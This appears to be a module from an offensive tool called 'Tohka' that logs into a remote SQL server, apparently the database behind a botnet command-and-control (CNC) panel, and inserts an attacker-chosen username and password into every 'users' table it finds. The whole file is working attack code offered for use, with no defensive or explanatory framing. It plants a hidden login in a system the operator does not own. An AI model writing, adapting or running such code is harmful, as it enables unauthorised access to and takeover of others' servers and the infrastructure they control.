from Tohka.lib.constants import SQL_FILTER #type: ignore
from Tohka.lib.colors    import Colors     #type: ignore
from Tohka.lib.login     import login_sql  #type: ignore

class TohkaModule:
    def main(params: str) -> None:
        """Inject a custom CNC login.

        Args:
            params(str): SQL server IP address, username to inject, password to inject

        Returns:
            None
        """


        ip, user, passw = params.split()
        injected: bool = False

        if (conn := login_sql(ip)):
            cursor = conn.cursor()
            cursor.execute('show databases')
            # NOTE: Check each database for the users table.
            print(f'\n{Colors.YELLOW}• {Colors.WHITE}Attempting to inject login {Colors.WHITE}({Colors.PURPLE}{user}{Colors.WHITE}:{Colors.PURPLE}{passw}{Colors.WHITE})...')
            for db in [db[0] for db in cursor.fetchall() if not [filt for filt in SQL_FILTER if filt in db[0]]]:            
                try:
                    # NOTE: Inject our custom login into the users table.
                    cursor.execute(f'use {db};')   
                    cursor.execute(f"INSERT INTO users VALUES (NULL, '{user}', '{passw}', 0, 0, 0, 0, -1, 1, 30, '');")
                    injected: bool = True
                    print(f'  {Colors.LIME}• {Colors.WHITE}Injected login into database {Colors.PURPLE}{db}{Colors.WHITE}.')
                    # NOTE: Select users table so we can 
                    # NOTE: dump the credentials out.
                except:
                    # NOTE: users table was not found (failed to inject to and select the table).
                    continue
                
            if not injected:
                print(f'  {Colors.RED}• {Colors.WHITE}Failed to inject login {Colors.WHITE}({Colors.PURPLE}{user}{Colors.WHITE}:{Colors.PURPLE}{passw}{Colors.WHITE}){Colors.WHITE}.')
        print()
        



